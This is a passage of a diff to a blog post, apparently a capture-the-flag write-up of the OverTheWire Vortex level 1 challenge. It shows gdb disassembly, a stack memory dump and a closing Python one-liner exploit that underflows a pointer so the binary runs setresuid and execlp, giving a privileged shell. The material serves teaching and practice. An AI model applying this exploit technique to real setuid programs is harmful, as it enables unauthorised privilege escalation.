-</span><span class='line'>End of assembler dump.</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">set</span> <span class="n">disassembly</span><span class="o">-</span><span class="n">flavor</span> <span class="n">intel</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">set</span> <span class="n">pagination</span> <span class="n">off</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disassemble</span> <span class="n">main</span>
+</span><span class='line'><span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="n">main</span><span class="p">:</span>
+</span><span class='line'>   <span class="mh">0x080485c0</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">push</span>   <span class="n">ebp</span>
+</span><span class='line'>   <span class="mh">0x080485c1</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
+</span><span class='line'>   <span class="mh">0x080485c3</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">push</span>   <span class="n">esi</span>
+</span><span class='line'>   <span class="mh">0x080485c4</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">push</span>   <span class="n">ebx</span>
+</span><span class='line'>   <span class="mh">0x080485c5</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;</span><span class="p">:</span>    <span class="ow">and</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xfffffff0</span>
+</span><span class='line'>   <span class="mh">0x080485c8</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x220</span>                  <span class="c"># Set stack pointer</span>
+</span><span class='line'>   <span class="mh">0x080485ce</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">gs</span><span class="p">:</span><span class="mh">0x14</span>
+</span><span class='line'>   <span class="mh">0x080485d4</span> <span class="o">&lt;+</span><span class="mi">20</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x21c</span><span class="p">],</span><span class="n">eax</span>
+</span><span class='line'>   <span class="mh">0x080485db</span> <span class="o">&lt;+</span><span class="mi">27</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
+</span><span class='line'>   <span class="mh">0x080485dd</span> <span class="o">&lt;+</span><span class="mi">29</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">lea</span>    <span class="n">eax</span><span class="p">,[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x1c</span><span class="p">]</span>
+</span><span class='line'>   <span class="mh">0x080485e1</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x100</span>                  <span class="c"># + (sizeof(buf) / 2)</span>
+</span><span class='line'>   <span class="mh">0x080485e6</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">],</span><span class="n">eax</span>   <span class="c"># ptr is located at $esp + 0x14</span>
+</span><span class='line'>   <span class="mh">0x080485ea</span> <span class="o">&lt;+</span><span class="mi">42</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">jmp</span>    <span class="mh">0x804868e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">206</span><span class="o">&gt;</span>
+</span><span class='line'>   <span class="mh">0x080485ef</span> <span class="o">&lt;+</span><span class="mi">47</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>
+</span><span class='line'>   <span class="mh">0x080485f3</span> <span class="o">&lt;+</span><span class="mi">51</span><span class="o">&gt;</span><span class="p">:</span>   <span class="nb">cmp</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0xa</span>
+</span><span class='line'>   <span class="mh">0x080485f6</span> <span class="o">&lt;+</span><span class="mi">54</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">je</span>     <span class="mh">0x80485ff</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;</span>
+</span><span class='line'>   <span class="mh">0x080485f8</span> <span class="o">&lt;+</span><span class="mi">56</span><span class="o">&gt;</span><span class="p">:</span>   <span class="nb">cmp</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x5c</span>
+</span><span class='line'>   <span class="mh">0x080485fb</span> <span class="o">&lt;+</span><span class="mi">59</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">je</span>     <span class="mh">0x8048615</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">85</span><span class="o">&gt;</span>
+</span><span class='line'>   <span class="mh">0x080485fd</span> <span class="o">&lt;+</span><span class="mi">61</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">jmp</span>    <span class="mh">0x804861c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">92</span><span class="o">&gt;</span>
+</span><span class='line'>   <span class="mh">0x080485ff</span> <span class="o">&lt;+</span><span class="mi">63</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="mh">0x200</span>
+</span><span class='line'>   <span class="mh">0x08048607</span> <span class="o">&lt;+</span><span class="mi">71</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">lea</span>    <span class="n">eax</span><span class="p">,[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x1c</span><span class="p">]</span>
+</span><span class='line'>   <span class="mh">0x0804860b</span> <span class="o">&lt;+</span><span class="mi">75</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
+</span><span class='line'>   <span class="mh">0x0804860e</span> <span class="o">&lt;+</span><span class="mi">78</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">call</span>   <span class="mh">0x804856d</span> <span class="o">&lt;</span><span class="k">print</span><span class="o">&gt;</span>
+</span><span class='line'>   <span class="mh">0x08048613</span> <span class="o">&lt;+</span><span class="mi">83</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">jmp</span>    <span class="mh">0x804868e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">206</span><span class="o">&gt;</span>
+</span><span class='line'>   <span class="mh">0x08048615</span> <span class="o">&lt;+</span><span class="mi">85</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">sub</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">],</span><span class="mh">0x1</span>
+</span><span class='line'>   <span class="mh">0x0804861a</span> <span class="o">&lt;+</span><span class="mi">90</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">jmp</span>    <span class="mh">0x804868e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">206</span><span class="o">&gt;</span>
+</span><span class='line'>   <span class="mh">0x0804861c</span> <span class="o">&lt;+</span><span class="mi">92</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">]</span>
+</span><span class='line'>   <span class="mh">0x08048620</span> <span class="o">&lt;+</span><span class="mi">96</span><span class="o">&gt;</span><span class="p">:</span>   <span class="ow">and</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0xff000000</span>
+</span><span class='line'>   <span class="mh">0x08048625</span> <span class="o">&lt;+</span><span class="mi">101</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nb">cmp</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0xca000000</span>
+</span><span class='line'>   <span class="mh">0x0804862a</span> <span class="o">&lt;+</span><span class="mi">106</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">jne</span>    <span class="mh">0x804866b</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">171</span><span class="o">&gt;</span>
+</span><span class='line'>   <span class="mh">0x0804862c</span> <span class="o">&lt;+</span><span class="mi">108</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">call</span>   <span class="mh">0x8048430</span> <span class="o">&lt;</span><span class="n">geteuid</span><span class="nd">@plt</span><span class="o">&gt;</span>
+</span><span class='line'>   <span class="mh">0x08048631</span> <span class="o">&lt;+</span><span class="mi">113</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">esi</span><span class="p">,</span><span class="n">eax</span>
+</span><span class='line'>   <span class="mh">0x08048633</span> <span class="o">&lt;+</span><span class="mi">115</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">call</span>   <span class="mh">0x8048430</span> <span class="o">&lt;</span><span class="n">geteuid</span><span class="nd">@plt</span><span class="o">&gt;</span>
+</span><span class='line'>   <span class="mh">0x08048638</span> <span class="o">&lt;+</span><span class="mi">120</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">eax</span>
+</span><span class='line'>   <span class="mh">0x0804863a</span> <span class="o">&lt;+</span><span class="mi">122</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">call</span>   <span class="mh">0x8048430</span> <span class="o">&lt;</span><span class="n">geteuid</span><span class="nd">@plt</span><span class="o">&gt;</span>
+</span><span class='line'>   <span class="mh">0x0804863f</span> <span class="o">&lt;+</span><span class="mi">127</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="n">esi</span>
+</span><span class='line'>   <span class="mh">0x08048643</span> <span class="o">&lt;+</span><span class="mi">131</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">ebx</span>
+</span><span class='line'>   <span class="mh">0x08048647</span> <span class="o">&lt;+</span><span class="mi">135</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
+</span><span class='line'>   <span class="mh">0x0804864a</span> <span class="o">&lt;+</span><span class="mi">138</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">call</span>   <span class="mh">0x80483e0</span> <span class="o">&lt;</span><span class="n">setresuid</span><span class="nd">@plt</span><span class="o">&gt;</span>
+</span><span class='line'>   <span class="mh">0x0804864f</span> <span class="o">&lt;+</span><span class="mi">143</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="mh">0x0</span>
+</span><span class='line'>   <span class="mh">0x08048657</span> <span class="o">&lt;+</span><span class="mi">151</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="mh">0x804876a</span>
+</span><span class='line'>   <span class="mh">0x0804865f</span> <span class="o">&lt;+</span><span class="mi">159</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x804876d</span>
+</span><span class='line'>   <span class="mh">0x08048666</span> <span class="o">&lt;+</span><span class="mi">166</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">call</span>   <span class="mh">0x8048420</span> <span class="o">&lt;</span><span class="n">execlp</span><span class="nd">@plt</span><span class="o">&gt;</span>
+</span><span class='line'>   <span class="mh">0x0804866b</span> <span class="o">&lt;+</span><span class="mi">171</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">lea</span>    <span class="n">eax</span><span class="p">,[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x1c</span><span class="p">]</span>
+</span><span class='line'>   <span class="mh">0x0804866f</span> <span class="o">&lt;+</span><span class="mi">175</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x200</span>
+</span><span class='line'>   <span class="mh">0x08048674</span> <span class="o">&lt;+</span><span class="mi">180</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nb">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">],</span><span class="n">eax</span>
+</span><span class='line'>   <span class="mh">0x08048678</span> <span class="o">&lt;+</span><span class="mi">184</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">jbe</span>    <span class="mh">0x804867c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">188</span><span class="o">&gt;</span>
+</span><span class='line'>   <span class="mh">0x0804867a</span> <span class="o">&lt;+</span><span class="mi">186</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">jmp</span>    <span class="mh">0x804868d</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">205</span><span class="o">&gt;</span>
+</span><span class='line'>   <span class="mh">0x0804867c</span> <span class="o">&lt;+</span><span class="mi">188</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">]</span>
+</span><span class='line'>   <span class="mh">0x08048680</span> <span class="o">&lt;+</span><span class="mi">192</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">lea</span>    <span class="n">edx</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x1</span><span class="p">]</span>
+</span><span class='line'>   <span class="mh">0x08048683</span> <span class="o">&lt;+</span><span class="mi">195</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">],</span><span class="n">edx</span>
+</span><span class='line'>   <span class="mh">0x08048687</span> <span class="o">&lt;+</span><span class="mi">199</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>
+</span><span class='line'>   <span class="mh">0x0804868b</span> <span class="o">&lt;+</span><span class="mi">203</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="p">],</span><span class="n">dl</span>
+</span><span class='line'>   <span class="mh">0x0804868d</span> <span class="o">&lt;+</span><span class="mi">205</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">nop</span>
+</span><span class='line'>   <span class="mh">0x0804868e</span> <span class="o">&lt;+</span><span class="mi">206</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">call</span>   <span class="mh">0x8048400</span> <span class="o">&lt;</span><span class="n">getchar</span><span class="nd">@plt</span><span class="o">&gt;</span>
+</span><span class='line'>   <span class="mh">0x08048693</span> <span class="o">&lt;+</span><span class="mi">211</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">],</span><span class="n">eax</span>          <span class="c"># x is located at $esp + 0x18</span>
+</span><span class='line'>   <span class="mh">0x08048697</span> <span class="o">&lt;+</span><span class="mi">215</span><span class="o">&gt;</span><span class="p">:</span>  <span class="nb">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">],</span><span class="mh">0xffffffff</span>
+</span><span class='line'>   <span class="mh">0x0804869c</span> <span class="o">&lt;+</span><span class="mi">220</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">jne</span>    <span class="mh">0x80485ef</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">47</span><span class="o">&gt;</span>
+</span><span class='line'>   <span class="mh">0x080486a2</span> <span class="o">&lt;+</span><span class="mi">226</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x8048775</span>
+</span><span class='line'>   <span class="mh">0x080486a9</span> <span class="o">&lt;+</span><span class="mi">233</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">call</span>   <span class="mh">0x8048440</span> <span class="o">&lt;</span><span class="n">puts</span><span class="nd">@plt</span><span class="o">&gt;</span>
+</span><span class='line'>   <span class="mh">0x080486ae</span> <span class="o">&lt;+</span><span class="mi">238</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
+</span><span class='line'>   <span class="mh">0x080486b3</span> <span class="o">&lt;+</span><span class="mi">243</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">mov</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x21c</span><span class="p">]</span>
+</span><span class='line'>   <span class="mh">0x080486ba</span> <span class="o">&lt;+</span><span class="mi">250</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">xor</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">gs</span><span class="p">:</span><span class="mh">0x14</span>
+</span><span class='line'>   <span class="mh">0x080486c1</span> <span class="o">&lt;+</span><span class="mi">257</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">je</span>     <span class="mh">0x80486c8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">264</span><span class="o">&gt;</span>
+</span><span class='line'>   <span class="mh">0x080486c3</span> <span class="o">&lt;+</span><span class="mi">259</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">call</span>   <span class="mh">0x8048410</span> <span class="o">&lt;</span><span class="n">__stack_chk_fail</span><span class="nd">@plt</span><span class="o">&gt;</span>
+</span><span class='line'>   <span class="mh">0x080486c8</span> <span class="o">&lt;+</span><span class="mi">264</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">lea</span>    <span class="n">esp</span><span class="p">,[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x8</span><span class="p">]</span>
+</span><span class='line'>   <span class="mh">0x080486cb</span> <span class="o">&lt;+</span><span class="mi">267</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">pop</span>    <span class="n">ebx</span>
+</span><span class='line'>   <span class="mh">0x080486cc</span> <span class="o">&lt;+</span><span class="mi">268</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">pop</span>    <span class="n">esi</span>
+</span><span class='line'>   <span class="mh">0x080486cd</span> <span class="o">&lt;+</span><span class="mi">269</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">pop</span>    <span class="n">ebp</span>
+</span><span class='line'>   <span class="mh">0x080486ce</span> <span class="o">&lt;+</span><span class="mi">270</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">ret</span>
+</span><span class='line'><span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="o">.</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
-<p>We can see that on main+8, the stack pointer <code>esp</code> is decreased by 0x220 to make room for <code>unsigned
+<p>At <code>main+8</code>, the stack pointer <code>esp</code> is decreased by 0x220 to make room for <code>unsigned
 char buf[512]</code>, <code>unsigned char *ptr</code>, and <code>unsigned int x</code>. If we look more closely at the assembly,
 we can see <code>ptr</code> is located at <code>esp + 0x14</code> because the instruction before that increases <code>eax</code> by
 <code>0x100</code> or <code>(sizeof(buf) / 2)</code> or 256. <code>main+211</code> shows <code>x</code> is located right after <code>ptr</code> at <code>esp +
@@ -291,7 +432,7 @@ bytes not 4 since memory should be 64-bit- or 8-byte-addressable?</p>
 <p>We set a breakpoint at the <code>getchar()</code> call and run the program. Examine the first 64 words of <code>esp</code>
 in hexadecimal.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -316,31 +457,32 @@ in hexadecimal.</p>
 <span class='line-number'>23</span>
 <span class='line-number'>24</span>
 <span class='line-number'>25</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) break *main+206
-</span><span class='line'>Breakpoint 1 at 0x804868e
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="o">*</span><span class="n">main</span><span class="o">+</span><span class="mi">206</span>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x804868e</span>
 </span><span class='line'>
-</span><span class='line'>(gdb) run
-</span><span class='line'>Starting program: /vortex/vortex1
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">run</span>
+</span><span class='line'><span class="n">Starting</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">vortex</span><span class="o">/</span><span class="n">vortex1</span>
 </span><span class='line'>
-</span><span class='line'>Breakpoint 1, 0x0804868e in main ()
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x0804868e</span> <span class="ow">in</span> <span class="n">main</span> <span class="p">()</span>
 </span><span class='line'>
-</span><span class='line'>(gdb) x/64wx $esp
-</span><span class='line'>0xffffd4c0:   0xf7e303b4  0xf7fd81a8  0x00000000  0xf7fec4a8
-</span><span class='line'>0xffffd4d0:   0x00000007  0xffffd5dc  0x00000001  0x00000000
-</span><span class='line'>0xffffd4e0:   0x00000001  0xf7fd81a8  0xf7ffd000  0xf7fe6d3b
-</span><span class='line'>0xffffd4f0:   0xf7ffc000  0x00001000  0x00000001  0xf7fe6cfc
-</span><span class='line'>0xffffd500:   0xf7ffd000  0x00000000  0xffffd5c8  0xf7fe724b
-</span><span class='line'>0xffffd510:   0xf7ffdaf0  0xf7fd8760  0x00000001  0x00000001
-</span><span class='line'>0xffffd520:   0x00000000  0xf7ff578c  0x00000000  0x00000000
-</span><span class='line'>0xffffd530:   0xf7ffd55c  0xffffd598  0xffffd5b8  0x00000000
-</span><span class='line'>0xffffd540:   0xf7ff578c  0xf7ffd55c  0xffffd5b8  0xf7fdc4ac
-</span><span class='line'>0xffffd550:   0xf7fdc2dc  0xf7fe4f3d  0xf7e36061  0x080482ff
-</span><span class='line'>0xffffd560:   0x00000000  0xf7fdc33c  0x00000000  0xf7fdc000
-</span><span class='line'>0xffffd570:   0x00000040  0x00000002  0x0804827d  0xf7ffdc24
-</span><span class='line'>0xffffd580:   0xf7e226bc  0xf7ffd000  0xf7e26cc4  0x00000001
-</span><span class='line'>0xffffd590:   0xf7fd8460  0xf7fe5694  0x00000000  0x00000000
-</span><span class='line'>0xffffd5a0:   0x00000000  0x00000000  0xf7fd8460  0x00000003
-</span><span class='line'>0xffffd5b0:   0xffffd5e0  0x07b1ea71  0xf63d4e2e  0xf7e26ed4</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">64</span><span class="n">wx</span> <span class="err">$</span><span class="n">esp</span>
+</span><span class='line'><span class="mh">0xffffd4c0</span><span class="p">:</span>    <span class="mh">0xf7e303b4</span>  <span class="mh">0xf7fd81a8</span>  <span class="mh">0x00000000</span>  <span class="mh">0xf7fec4a8</span>
+</span><span class='line'><span class="mh">0xffffd4d0</span><span class="p">:</span>    <span class="mh">0x00000007</span>  <span class="mh">0xffffd5dc</span>  <span class="mh">0x00000001</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0xffffd4e0</span><span class="p">:</span>    <span class="mh">0x00000001</span>  <span class="mh">0xf7fd81a8</span>  <span class="mh">0xf7ffd000</span>  <span class="mh">0xf7fe6d3b</span>
+</span><span class='line'><span class="mh">0xffffd4f0</span><span class="p">:</span>    <span class="mh">0xf7ffc000</span>  <span class="mh">0x00001000</span>  <span class="mh">0x00000001</span>  <span class="mh">0xf7fe6cfc</span>
+</span><span class='line'><span class="mh">0xffffd500</span><span class="p">:</span>    <span class="mh">0xf7ffd000</span>  <span class="mh">0x00000000</span>  <span class="mh">0xffffd5c8</span>  <span class="mh">0xf7fe724b</span>
+</span><span class='line'><span class="mh">0xffffd510</span><span class="p">:</span>    <span class="mh">0xf7ffdaf0</span>  <span class="mh">0xf7fd8760</span>  <span class="mh">0x00000001</span>  <span class="mh">0x00000001</span>
+</span><span class='line'><span class="mh">0xffffd520</span><span class="p">:</span>    <span class="mh">0x00000000</span>  <span class="mh">0xf7ff578c</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0xffffd530</span><span class="p">:</span>    <span class="mh">0xf7ffd55c</span>  <span class="mh">0xffffd598</span>  <span class="mh">0xffffd5b8</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0xffffd540</span><span class="p">:</span>    <span class="mh">0xf7ff578c</span>  <span class="mh">0xf7ffd55c</span>  <span class="mh">0xffffd5b8</span>  <span class="mh">0xf7fdc4ac</span>
+</span><span class='line'><span class="mh">0xffffd550</span><span class="p">:</span>    <span class="mh">0xf7fdc2dc</span>  <span class="mh">0xf7fe4f3d</span>  <span class="mh">0xf7e36061</span>  <span class="mh">0x080482ff</span>
+</span><span class='line'><span class="mh">0xffffd560</span><span class="p">:</span>    <span class="mh">0x00000000</span>  <span class="mh">0xf7fdc33c</span>  <span class="mh">0x00000000</span>  <span class="mh">0xf7fdc000</span>
+</span><span class='line'><span class="mh">0xffffd570</span><span class="p">:</span>    <span class="mh">0x00000040</span>  <span class="mh">0x00000002</span>  <span class="mh">0x0804827d</span>  <span class="mh">0xf7ffdc24</span>
+</span><span class='line'><span class="mh">0xffffd580</span><span class="p">:</span>    <span class="mh">0xf7e226bc</span>  <span class="mh">0xf7ffd000</span>  <span class="mh">0xf7e26cc4</span>  <span class="mh">0x00000001</span>
+</span><span class='line'><span class="mh">0xffffd590</span><span class="p">:</span>    <span class="mh">0xf7fd8460</span>  <span class="mh">0xf7fe5694</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0xffffd5a0</span><span class="p">:</span>    <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0xf7fd8460</span>  <span class="mh">0x00000003</span>
+</span><span class='line'><span class="mh">0xffffd5b0</span><span class="p">:</span>    <span class="mh">0xffffd5e0</span>  <span class="mh">0x07b1ea71</span>  <span class="mh">0xf63d4e2e</span>  <span class="mh">0xf7e26ed4</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p><code>ptr</code> is located at <code>$esp + 0x14 = 0xffffd4d4</code> which is initialized with a value of <code>0xffffd5dc</code>.
@@ -350,10 +492,11 @@ Since ASLR is disabled, this location is fixed.</p>
 byte was <code>0xca</code>. That way, when it&rsquo;s bit-wise ANDed with <code>0xff000000</code>, the result would be
 <code>0xca000000</code>. The exploit command would be the following.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(python -c 'import sys; sys.stdout.write("\\" * (0xffffe470-0xcaffffff) + "\x00")'; cat) \
-</span><span class='line'>  | /vortex/vortex1</span></code></pre></td></tr></table></div></figure>
